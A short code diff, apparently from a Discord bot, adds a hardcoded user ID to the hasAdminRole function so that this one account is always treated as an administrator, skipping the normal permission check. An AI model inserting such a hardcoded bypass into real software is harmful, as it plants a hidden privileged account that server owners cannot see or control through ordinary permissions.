@@ -24,6 +24,9 @@ export async function hasAdminRole(
 ): Promise<boolean> {
   if (!member) return false;
 
+  const SUPER_ADMIN_ID = "732706429147807825";
+  if ("user" in member && member.user.id === SUPER_ADMIN_ID) return true;
+
   const perms = getPermissions(member);
   if (perms?.has(PermissionsBitField.Flags.Administrator)) return true;
 
